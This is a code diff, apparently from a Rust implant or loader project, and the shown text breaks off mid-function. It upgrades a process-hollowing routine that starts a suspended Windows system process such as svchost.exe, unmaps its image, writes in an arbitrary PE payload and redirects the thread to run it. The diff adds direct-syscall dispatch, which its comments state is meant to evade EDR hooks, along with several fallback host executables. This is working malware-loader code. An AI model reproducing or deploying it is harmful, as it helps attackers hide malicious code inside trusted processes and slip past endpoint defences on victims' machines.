@@ -89,6 +89,192 @@ unsafe fn rva_to_file_offset32(
     rva_to_file_offset_sections(rva, &descs)
 }
 
+// ─── NT API infrastructure ────────────────────────────────────────────────
+//
+// All cross-process operations (process/thread creation, memory allocation,
+// read/write, context manipulation) are dispatched through NT functions
+// resolved via PEB-walk (pe_resolve), so no IAT entries for kernel32/user32
+// Win32 wrappers (CreateProcessA, VirtualAllocEx, WriteProcessMemory, etc.)
+// are required.  EDR solutions commonly hook the IAT-visible Win32 entry
+// points but cannot safely inline-hook every ntdll syscall stub.
+
+/// NT OBJECT_ATTRIBUTES — required by NtOpenFile, NtCreateSection.
+#[cfg(windows)]
+#[repr(C)]
+struct NtObjectAttributes {
+    length: u32,
+    root_directory: *mut c_void,
+    object_name: *mut winapi::shared::ntdef::UNICODE_STRING,
+    attributes: u32,
+    security_descriptor: *mut c_void,
+    security_quality_of_service: *mut c_void,
+}
+
+/// NT IO_STATUS_BLOCK — required by NtOpenFile.
+#[cfg(windows)]
+#[repr(C)]
+struct IoStatusBlock {
+    pointer: usize, // union: NTSTATUS / PVOID — only return value is checked
+    information: usize,
+}
+
+// NT constants absent from the winapi features enabled for this crate.
+#[cfg(windows)] const NT_OBJ_CASE_INSENSITIVE: u32 = 0x40;
+#[cfg(windows)] const NT_FILE_READ_DATA: u32 = 0x0001;
+#[cfg(windows)] const NT_FILE_EXECUTE: u32 = 0x0020;
+#[cfg(windows)] const NT_SYNCHRONIZE: u32 = 0x0010_0000;
+#[cfg(windows)] const NT_FILE_SHARE_READ: u32 = 0x0001;
+#[cfg(windows)] const NT_FILE_SHARE_DELETE: u32 = 0x0004;
+#[cfg(windows)] const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
+#[cfg(windows)] const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
+#[cfg(windows)] const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
+#[cfg(windows)] const NT_SEC_IMAGE: u32 = 0x0100_0000;
+#[cfg(windows)] const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
+#[cfg(windows)] const NT_THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
+/// THREAD_CREATE_FLAGS_CREATE_SUSPENDED
+#[cfg(windows)] const NT_THREAD_SUSPENDED: u32 = 0x0000_0001;
+/// NtCurrentProcess() pseudo-handle (-1).
+#[cfg(windows)] const NT_CURRENT_PROCESS: usize = usize::MAX;
+/// MEM_RELEASE for NtFreeVirtualMemory.
+#[cfg(windows)] const NT_MEM_RELEASE: u32 = 0x8000;
+
+/// Resolve a function from the loaded `ntdll.dll` via PEB-walk.
+#[cfg(windows)]
+#[inline]
+unsafe fn resolve_nt(name: &[u8]) -> Option<usize> {
+    let base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
+    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(name))
+}
+
+/// Convert a Win32 DOS path to a `\??\`-prefixed NT namespace path as a
+/// null-terminated wide string.
+#[cfg(windows)]
+fn dos_to_nt_path(dos_path: &str) -> Vec<u16> {
+    format!("\\??\\{}", dos_path)
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect()
+}
+
+/// Return a prioritised list of host-process paths to try for hollowing.
+/// Using a list avoids hard failures on hardened environments where
+/// `svchost.exe` has been moved or renamed.
+#[cfg(windows)]
+fn host_candidate_paths() -> Vec<String> {
+    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
+    vec![
+        format!(r"{}\System32\svchost.exe", sysroot),
+        format!(r"{}\System32\RuntimeBroker.exe", sysroot),
+        format!(r"{}\System32\dllhost.exe", sysroot),
+        format!(r"{}\System32\werfault.exe", sysroot),
+    ]
+}
+
+/// Create a new suspended process from `exe_path` using NT direct syscalls:
+///   NtOpenFile → NtCreateSection(SEC_IMAGE) → NtCreateProcessEx → NtCreateThreadEx
+///
+/// All NT functions are dispatched through `nt_syscall::syscall!` (SSN resolved
+/// via Halo's Gate or clean-ntdll mapping) so no hooked IAT entries are needed.
+///
+/// Returns `(hProcess, hThread)`.  The caller must close both handles.
+#[cfg(windows)]
+unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
+    // Build NT namespace path and UNICODE_STRING.
+    let mut path_wide = dos_to_nt_path(exe_path);
+    let byte_len = ((path_wide.len() - 1) * 2) as u16;
+    let mut ustr = winapi::shared::ntdef::UNICODE_STRING {
+        Length: byte_len,
+        MaximumLength: byte_len + 2,
+        Buffer: path_wide.as_mut_ptr(),
+    };
+    let mut oa = NtObjectAttributes {
+        length: std::mem::size_of::<NtObjectAttributes>() as u32,
+        root_directory: std::ptr::null_mut(),
+        object_name: &mut ustr,
+        attributes: NT_OBJ_CASE_INSENSITIVE,
+        security_descriptor: std::ptr::null_mut(),
+        security_quality_of_service: std::ptr::null_mut(),
+    };
+    let mut isb = IoStatusBlock { pointer: 0, information: 0 };
+
+    let mut h_file: *mut c_void = std::ptr::null_mut();
+    let s = nt_syscall::syscall!(
+        "NtOpenFile",
+        &mut h_file as *mut _ as u64,
+        (NT_FILE_READ_DATA | NT_FILE_EXECUTE | NT_SYNCHRONIZE) as u64,
+        &mut oa as *mut _ as u64,
+        &mut isb as *mut _ as u64,
+        (NT_FILE_SHARE_READ | NT_FILE_SHARE_DELETE) as u64,
+        (NT_FILE_SYNC_IO_NONALERT | NT_FILE_NON_DIRECTORY) as u64,
+    ).map_err(|e| anyhow!("NtOpenFile SSN: {e}"))?;
+    if s < 0 || h_file.is_null() {
+        return Err(anyhow!("NtOpenFile({}) NTSTATUS {:#010x}", exe_path, s as u32));
+    }
+
+    let mut h_section: *mut c_void = std::ptr::null_mut();
+    let s = nt_syscall::syscall!(
+        "NtCreateSection",
+        &mut h_section as *mut _ as u64,
+        NT_SECTION_ALL_ACCESS as u64,
+        0u64,
+        0u64,
+        winapi::um::winnt::PAGE_EXECUTE_READ as u64,
+        NT_SEC_IMAGE as u64,
+        h_file as u64,
+    ).map_err(|e| anyhow!("NtCreateSection SSN: {e}"))?;
+    // Close file handle regardless of section creation result.
+    let _ = nt_syscall::syscall!("NtClose", h_file as u64);
+    if s < 0 || h_section.is_null() {
+        return Err(anyhow!("NtCreateSection({}) NTSTATUS {:#010x}", exe_path, s as u32));
+    }
+
+    let mut h_process: *mut c_void = std::ptr::null_mut();
+    let s = nt_syscall::syscall!(
+        "NtCreateProcessEx",
+        &mut h_process as *mut _ as u64,
+        NT_PROCESS_ALL_ACCESS as u64,
+        0u64,
+        NT_CURRENT_PROCESS as u64,
+        0u64,
+        h_section as u64,
+        0u64,
+        0u64,
+        0u64,
+    ).map_err(|e| anyhow!("NtCreateProcessEx SSN: {e}"))?;
+    let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+    if s < 0 || h_process.is_null() {
+        return Err(anyhow!("NtCreateProcessEx({}) NTSTATUS {:#010x}", exe_path, s as u32));
+    }
+
+    // Resolve a suitable thread start routine inside ntdll.
+    let start_addr = resolve_nt(b"RtlUserThreadStart\0")
+        .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
+        .ok_or_else(|| anyhow!("RtlUserThreadStart not found in ntdll"))?;
+
+    let mut h_thread: *mut c_void = std::ptr::null_mut();
+    let s = nt_syscall::syscall!(
+        "NtCreateThreadEx",
+        &mut h_thread as *mut _ as u64,
+        NT_THREAD_ALL_ACCESS as u64,
+        0u64,
+        h_process as u64,
+        start_addr as u64,
+        0u64,
+        NT_THREAD_SUSPENDED as u64,
+        0u64,
+        0u64,
+        0u64,
+        0u64,
+    ).map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
+    if s < 0 || h_thread.is_null() {
+        let _ = nt_syscall::syscall!("NtTerminateProcess", h_process as u64, 1u64);
+        let _ = nt_syscall::syscall!("NtClose", h_process as u64);
+        return Err(anyhow!("NtCreateThreadEx({}) NTSTATUS {:#010x}", exe_path, s as u32));
+    }
+
+    Ok((h_process, h_thread))
+}
+
 /// M-26 Part E: load a DLL into our own process via `LdrLoadDll` (resolved via
 /// PEB walk) instead of the hookable `LoadLibraryA` IAT entry. Returns 0 on
 /// failure, in which case the caller leaves the corresponding IAT slot empty.
@@ -273,40 +459,29 @@ unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut st
     (base + func_rva) as *mut std::ffi::c_void
 }
 
-/// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
+/// Hollow a new suspended process and execute the provided PE payload inside it.
+///
+/// The host process is chosen from a prioritised candidate list (svchost.exe,
+/// RuntimeBroker.exe, dllhost.exe, werfault.exe) so the function does not hard-
+/// fail if svchost.exe has been moved or renamed in a hardened environment.
+///
+/// Process creation uses NtCreateProcessEx + NtCreateThreadEx (resolved via
+/// PEB-walk) instead of the IAT-visible CreateProcessA.  All subsequent cross-
+/// process operations (memory allocation, read/write, context get/set, resume)
+/// also use NT functions resolved through pe_resolve to avoid IAT entries.
 #[cfg(windows)]
 pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     use std::mem::zeroed;
-    use std::ptr::null_mut;
-    use winapi::shared::basetsd::SIZE_T;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
-    use winapi::um::processthreadsapi::{
-        CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
-        STARTUPINFOA,
-    };
-    use winapi::um::winbase::CREATE_SUSPENDED;
     use winapi::um::winnt::{
-        CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER,
-        IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE, MEM_COMMIT,
-        MEM_RESERVE, PAGE_READWRITE,
+        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER,
+        IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE,
+        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
     };
 
-    // Resolve NtClose once; fall back to CloseHandle if unavailable
-    let nt_close_addr = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).and_then(
-            |base| pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0")),
-        )
-    };
+    // NtClose for handle cleanup via direct syscall.
     macro_rules! close_handle {
         ($h:expr) => {
-            if let Some(addr) = nt_close_addr {
-                type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
-                let nt_close: NtCloseFn = std::mem::transmute(addr as *const ());
-                nt_close($h);
-            } else {
-                CloseHandle($h);
-            }
+            let _ = nt_syscall::syscall!("NtClose", $h as u64);
         };
     }
 
@@ -351,9 +526,6 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         if (*nt).Signature != IMAGE_NT_SIGNATURE {
             return Err(anyhow!("hollow_and_execute: invalid NT signature"));
         }
-        // Only PE64 (OptionalHeader Magic = 0x020B) is supported.  Reading
-        // OptionalHeader fields through IMAGE_NT_HEADERS64 on a 32-bit PE
-        // (Magic = 0x010B) would read from wrong offsets and produce garbage.
         let opt_magic = (*nt).OptionalHeader.Magic;
         if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
             return Err(anyhow!(
@@ -366,222 +538,221 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
         let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
 
-        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
-        let host_path = format!("{}\\System32\\svchost.exe\0", sysroot);
-        let host = host_path.as_bytes();
-        let mut si: STARTUPINFOA = zeroed();
-        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-        let mut pi: PROCESS_INFORMATION = zeroed();
+        // Ensure the SSN resolution infrastructure (clean ntdll mapping) is
+        // initialised before any direct-syscall dispatch.  Errors are soft:
+        // the crate degrades to bootstrap (Halo's Gate) SSN resolution.
+        let _ = nt_syscall::init_syscall_infrastructure();
 
-        let ok = CreateProcessA(
-            host.as_ptr() as _,
-            null_mut(),
-            null_mut(),
-            null_mut(),
-            0,
-            CREATE_SUSPENDED,
-            null_mut(),
-            null_mut(),
-            &mut si,
-            &mut pi,
-        );
-        if ok == 0 {
-            return Err(anyhow!(
-                "CreateProcessA failed: {}",
-                winapi::um::errhandlingapi::GetLastError()
-            ));
+        macro_rules! nt_terminate_process {
+            ($h:expr) => {
+                let _ = nt_syscall::syscall!("NtTerminateProcess", $h as u64, 1u64);
+            };
         }
 
-        // NtUnmapViewOfSection to hollow the original image
-        // Use PEB walk via pe_resolve instead of GetModuleHandleA/GetProcAddress (2.3)
-        let ntdll_base =
-            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-                .unwrap_or(0);
-        if ntdll_base == 0 {
-            tracing::warn!("hollow_and_execute: ntdll base not found via PEB; original image will not be unmapped");
-        } else {
-            let unmap_addr = pe_resolve::get_proc_address_by_hash(
-                ntdll_base,
-                pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
-            )
-            .unwrap_or(0);
-            if unmap_addr == 0 {
-                tracing::warn!(
-                    "hollow_and_execute: NtUnmapViewOfSection not resolved; skipping unmap"
-                );
-            } else {
-                type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
-                let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_addr);
-
-                let mut ctx: CONTEXT = zeroed();
-                ctx.ContextFlags = CONTEXT_FULL;
-                if GetThreadContext(pi.hThread, &mut ctx) == 0 {
-                    tracing::warn!(
-                        "hollow_and_execute: GetThreadContext failed ({}); skipping unmap",
-                        winapi::um::errhandlingapi::GetLastError()
-                    );
-                } else {
-                    // In a newly created x64 process, Rdx holds the PEB address
-                    let peb_ptr = ctx.Rdx as *const u8;
-                    let mut remote_image_base: usize = 0;
-                    ReadProcessMemory(
-                        pi.hProcess,
-                        peb_ptr.add(0x10) as _,
-                        &mut remote_image_base as *mut _ as _,
-                        std::mem::size_of::<usize>(),
-                        null_mut(),
-                    );
-                    if remote_image_base == 0 {
-                        tracing::warn!(
-                            "hollow_and_execute: remote_image_base is NULL; skipping unmap"
-                        );
-                    } else {
-                        let unmap_status = nt_unmap(pi.hProcess, remote_image_base as _);
-                        if unmap_status < 0 {
-                            tracing::warn!("hollow_and_execute: NtUnmapViewOfSection returned 0x{:x}; continuing", unmap_status);
-                        }
-                    } // remote_image_base != 0
-                } // GetThreadContext succeeded
+        // Create the host process using NT direct syscalls.
+        let (h_process, h_thread) = {
+            let mut result: Result<(*mut c_void, *mut c_void)> =
+                Err(anyhow!("hollow_and_execute: all host process candidates failed"));
+            for path in host_candidate_paths() {
+                match create_suspended_process_nt(&path) {
+                    Ok(handles) => { result = Ok(handles); break; }
+                    Err(e) => tracing::debug!(
+                        "hollow_and_execute: candidate {} failed: {}", path, e),
+                }
             }
-        }
-
-        // Allocate with PAGE_READWRITE first; apply execute permission after writing (2.4)
-        let remote_base_ptr = VirtualAllocEx(
-            pi.hProcess,
-            preferred_base as _,
-            image_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
-        let remote_base_ptr = if remote_base_ptr.is_null() {
-            let fallback = VirtualAllocEx(
-                pi.hProcess,
-                null_mut(),
-                image_size,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
-            );
-            if fallback.is_null() {
-                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                close_handle!(pi.hThread);
-                close_handle!(pi.hProcess);
-                return Err(anyhow!("VirtualAllocEx failed for hollowing"));
-            }
-            fallback
-        } else {
-            remote_base_ptr
+            result?
         };
 
-        let remote_base = remote_base_ptr as usize;
-        let mut written: SIZE_T = 0;
+        // Get PEB address via NtQueryInformationProcess(ProcessBasicInformation=0).
+        //
+        // PROCESS_BASIC_INFORMATION layout (x64):
+        //   +0x00 ExitStatus      4 bytes
+        //   +0x08 PebBaseAddress  8 bytes  (4-byte padding before on x64)
+        //   total = 48 bytes
+        let mut pbi = [0u8; 48];
+        let mut ret_len: u32 = 0;
+        let s = nt_syscall::syscall!(
+            "NtQueryInformationProcess",
+            h_process as u64, 0u64,
+            pbi.as_mut_ptr() as u64, 48u64,
+            &mut ret_len as *mut _ as u64,
+        ).map_err(|e| anyhow!("NtQueryInformationProcess SSN: {e}"))?;
+        if s < 0 || ret_len < 16 {
+            nt_terminate_process!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "hollow_and_execute: NtQueryInformationProcess NTSTATUS {:#010x}", s as u32));
+        }
+        let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
+        if peb_addr == 0 {
+            nt_terminate_process!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!("hollow_and_execute: PEB address is NULL"));
+        }
+        let peb_ptr = peb_addr as *const u8;
 
-        // Write PE headers
-        if WriteProcessMemory(
-            pi.hProcess,
-            remote_base_ptr,
-            payload.as_ptr() as _,
-            (*nt).OptionalHeader.SizeOfHeaders as usize,
-            &mut written,
-        ) == 0
-        {
-            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            close_handle!(pi.hThread);
-            close_handle!(pi.hProcess);
-            return Err(anyhow!("WriteProcessMemory(headers) failed"));
+        // Read PEB.ImageBaseAddress (offset 0x10) and unmap the original image.
+        let mut remote_image_base: usize = 0;
+        let mut rd: usize = 0;
+        let _ = nt_syscall::syscall!(
+            "NtReadVirtualMemory",
+            h_process as u64,
+            peb_ptr.add(0x10) as u64,
+            &mut remote_image_base as *mut _ as u64,
+            std::mem::size_of::<usize>() as u64,
+            &mut rd as *mut _ as u64,
+        );
+        if remote_image_base != 0 {
+            let us = nt_syscall::syscall!(
+                "NtUnmapViewOfSection",
+                h_process as u64, remote_image_base as u64,
+            ).unwrap_or(-1);
+            if us < 0 {
+                tracing::warn!(
+                    "hollow_and_execute: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
+                    us as u32);
+            }
+        } else {
+            tracing::warn!("hollow_and_execute: remote_image_base is NULL; skipping unmap");
         }
 
-        // Write sections
+        // Allocate payload space (RW; execute applied per-section after write).
+        let mut alloc_base = preferred_base as *mut c_void;
+        let mut alloc_size = image_size;
+        let s = nt_syscall::syscall!(
+            "NtAllocateVirtualMemory",
+            h_process as u64, &mut alloc_base as *mut _ as u64,
+            0u64, &mut alloc_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+        ).unwrap_or(-1);
+        let remote_base_ptr = if s < 0 || alloc_base.is_null() {
+            let mut fb: *mut c_void = std::ptr::null_mut();
+            let mut fb_size = image_size;
+            let s2 = nt_syscall::syscall!(
+                "NtAllocateVirtualMemory",
+                h_process as u64, &mut fb as *mut _ as u64,
+                0u64, &mut fb_size as *mut _ as u64,
+                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+            ).unwrap_or(-1);
+            if s2 < 0 || fb.is_null() {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "NtAllocateVirtualMemory failed: NTSTATUS {:#010x}", s2 as u32));
+            }
+            fb
+        } else {
+            alloc_base
+        };
+        let remote_base = remote_base_ptr as usize;
+        let mut written: usize = 0;
+
+        // Write PE headers.
+        let s = nt_syscall::syscall!(
+            "NtWriteVirtualMemory",
+            h_process as u64, remote_base_ptr as u64,
+            payload.as_ptr() as u64,
+            (*nt).OptionalHeader.SizeOfHeaders as u64,
+            &mut written as *mut _ as u64,
+        ).unwrap_or(-1);
+        if s < 0 {
+            nt_terminate_process!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!("NtWriteVirtualMemory(headers) failed"));
+        }
+
+        // Write sections.
         let num_sections = (*nt).FileHeader.NumberOfSections as usize;
-        let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+        let first_section =
+            (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
             as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
         for i in 0..num_sections {
             let sec = &*first_section.add(i);
             let raw_off = sec.PointerToRawData as usize;
-            let raw_sz = sec.SizeOfRawData as usize;
+            let raw_sz  = sec.SizeOfRawData as usize;
             let virt_sz = *sec.Misc.VirtualSize() as usize;
             let copy_sz = raw_sz.min(virt_sz);
-            // Skip BSS / zero-initialised sections: PointerToRawData == 0 means
-            // there is no on-disk data for this section; the OS zero-fills it
-            // from the VirtualAlloc.  Also skip if the copy size is zero.
             if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                 continue;
             }
             let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
-            if WriteProcessMemory(
-                pi.hProcess,
-                dst,
-                payload.as_ptr().add(raw_off) as _,
-                copy_sz,
-                &mut written,
-            ) == 0
-            {
-                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                close_handle!(pi.hThread);
-                close_handle!(pi.hProcess);
-                return Err(anyhow!("WriteProcessMemory(section {}) failed", i));
+            let s = nt_syscall::syscall!(
+                "NtWriteVirtualMemory",
+                h_process as u64, dst as u64,
+                payload.as_ptr().add(raw_off) as u64,
+                copy_sz as u64,
+                &mut written as *mut _ as u64,
+            ).unwrap_or(-1);
+            if s < 0 {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!("NtWriteVirtualMemory(section {}) failed", i));
             }
         }
 
         let delta = remote_base as isize - preferred_base as isize;
         if delta != 0 {
-            // Refuse to proceed if the PE has no relocation directory — applying
-            // it at the wrong base without fixups will crash the hollowed process.
             let reloc_dir = &(*nt).OptionalHeader.DataDirectory
                 [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
             if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
-                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                close_handle!(pi.hThread);
-                close_handle!(pi.hProcess);
-                return Err(anyhow!("hollow_and_execute: VirtualAllocEx at preferred base failed and PE has no relocation directory; cannot fix up"));
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: preferred base unavailable and PE has no reloc directory"));
             }
-            apply_relocations_remote(pi.hProcess, remote_base, nt, payload, delta)?;
+            apply_relocations_remote(h_process, remote_base, nt, payload, delta)?;
         }
 
-        // Resolve and write the Import Address Table (2.2)
-        fix_iat_remote(pi.hProcess, remote_base, nt, payload, &mut written)?;
+        // Resolve and write the Import Address Table.
+        fix_iat_remote(h_process, remote_base, nt, payload, &mut written)?;
 
-        // Apply per-section memory protections now that the IAT has been written (2.4)
-        apply_section_protections(pi.hProcess, remote_base, nt);
+        // Apply per-section execute/write permissions.
+        apply_section_protections(h_process, remote_base, nt);
 
-        // Flush the instruction cache for the entire mapped image so the CPU sees
-        // the newly written code (L-04 fix).
-        winapi::um::processthreadsapi::FlushInstructionCache(
-            pi.hProcess,
-            remote_base as *mut c_void,
-            (*nt).OptionalHeader.SizeOfImage as usize,
+        // Flush instruction cache for the newly written image.
+        let _ = nt_syscall::syscall!(
+            "NtFlushInstructionCache",
+            h_process as u64, remote_base_ptr as u64,
+            (*nt).OptionalHeader.SizeOfImage as u64,
         );
 
-        // Update PEB.ImageBaseAddress
-        let mut ctx: CONTEXT = zeroed();
-        ctx.ContextFlags = CONTEXT_FULL;
-        if GetThreadContext(pi.hThread, &mut ctx) == 0 {
-            tracing::warn!(
-                "hollow_and_execute: GetThreadContext failed before PEB image-base update ({}); skipping PEB write",
-                winapi::um::errhandlingapi::GetLastError()
-            );
-        } else {
-            let peb_ptr = ctx.Rdx as *const u8;
-            WriteProcessMemory(
-                pi.hProcess,
-                peb_ptr.add(0x10) as _,
-                &remote_base as *const _ as _,
-                std::mem::size_of::<usize>(),
-                &mut written,
-            );
+        // Update PEB.ImageBaseAddress.
+        let _ = nt_syscall::syscall!(
+            "NtWriteVirtualMemory",
+            h_process as u64, peb_ptr.add(0x10) as u64,
+            &remote_base as *const _ as u64,
+            std::mem::size_of::<usize>() as u64,
+            &mut written as *mut _ as u64,
+        );
 
-            // Set new entry point (Rip, not Rcx — was 2.1 bug)
+        // Redirect the suspended thread's entry point to the hollowed payload.
+        let mut ctx: winapi::um::winnt::CONTEXT = zeroed();
+        ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
+        let s = nt_syscall::syscall!(
+            "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
+        ).unwrap_or(-1);
+        if s < 0 {
+            tracing::warn!(
+                "hollow_and_execute: NtGetContextThread failed; skipping entry-point redirect");
+        } else {
             ctx.Rip = (remote_base + entry_point_rva) as u64;
-            if SetThreadContext(pi.hThread, &ctx) == 0 {
-                tracing::warn!(
-                    "hollow_and_execute: SetThreadContext failed ({}); continuing",
-                    winapi::um::errhandlingapi::GetLastError()
-                );
+            if nt_syscall::syscall!(
+                "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
+            ).unwrap_or(-1) < 0 {
+                tracing::warn!("hollow_and_execute: NtSetContextThread failed; continuing");
             }
         }
-        ResumeThread(pi.hThread);
 
-        close_handle!(pi.hThread);
-        close_handle!(pi.hProcess);
+        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+
+        close_handle!(h_thread);
+        close_handle!(h_process);
     }
     Ok(())
 }
@@ -589,15 +760,6 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 #[cfg(windows)]
 unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     use std::mem::zeroed;
-    use std::path::Path;
-    use std::ptr::null_mut;
-    use winapi::shared::basetsd::SIZE_T;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
-    use winapi::um::processthreadsapi::{
-        CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA,
-    };
-    use winapi::um::winbase::CREATE_SUSPENDED;
     use winapi::um::winnt::{
         IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS32,
         IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE,
@@ -605,18 +767,10 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     };
     use winapi::um::wow64apiset::{Wow64GetThreadContext, Wow64SetThreadContext};
 
-    // Resolve NtClose once; fall back to CloseHandle if unavailable.
-    let nt_close_addr = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        .and_then(|base| pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0")));
+    // NtClose for handle cleanup.
     macro_rules! close_handle {
         ($h:expr) => {
-            if let Some(addr) = nt_close_addr {
-                type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
-                let nt_close: NtCloseFn = std::mem::transmute(addr as *const ());
-                nt_close($h);
-            } else {
-                CloseHandle($h);
-            }
+            let _ = nt_syscall::syscall!("NtClose", $h as u64);
         };
     }
 
@@ -653,7 +807,6 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         ));
     }
 
-    // PE32 images must fit entirely within the 32-bit virtual address range.
     let image_end = (preferred_base as u64)
         .checked_add(image_size as u64)
         .ok_or_else(|| anyhow!("hollow_and_execute: PE32 image base+size overflow"))?;
@@ -664,138 +817,116 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         ));
     }
 
+    // Resolve NT cross-process functions via direct syscalls — no Win32 IAT entries.
+    macro_rules! nt_terminate { ($h:expr) => {
+        let _ = nt_syscall::syscall!("NtTerminateProcess", $h as u64, 1u64);
+    }; }
+
+    // Prefer SysWOW64 path for 32-bit host process; fall back through candidate list.
     let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
-    let wow64_path = format!("{}\\SysWOW64\\svchost.exe", sysroot);
-    let system32_path = format!("{}\\System32\\svchost.exe", sysroot);
-    let selected = if Path::new(&wow64_path).exists() {
-        wow64_path
-    } else {
-        system32_path
+    let candidates = vec![
+        format!(r"{}\SysWOW64\svchost.exe", sysroot),
+        format!(r"{}\SysWOW64\RuntimeBroker.exe", sysroot),
+        format!(r"{}\SysWOW64\dllhost.exe", sysroot),
+        format!(r"{}\System32\svchost.exe", sysroot),
+    ];
+    let (h_process, h_thread) = {
+        let mut result: Result<(*mut c_void, *mut c_void)> =
+            Err(anyhow!("hollow_and_execute(pe32): all host process candidates failed"));
+        for path in &candidates {
+            match create_suspended_process_nt(path) {
+                Ok(handles) => { result = Ok(handles); break; }
+                Err(e) => tracing::debug!(
+                    "hollow_and_execute(pe32): candidate {} failed: {}", path, e),
+            }
+        }
+        result?
     };
-    let host_path = format!("{}\0", selected);
-    let host = host_path.as_bytes();
-
-    let mut si: STARTUPINFOA = zeroed();
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-    let mut pi: PROCESS_INFORMATION = zeroed();
-
-    let ok = CreateProcessA(
-        host.as_ptr() as _,
-        null_mut(),
-        null_mut(),
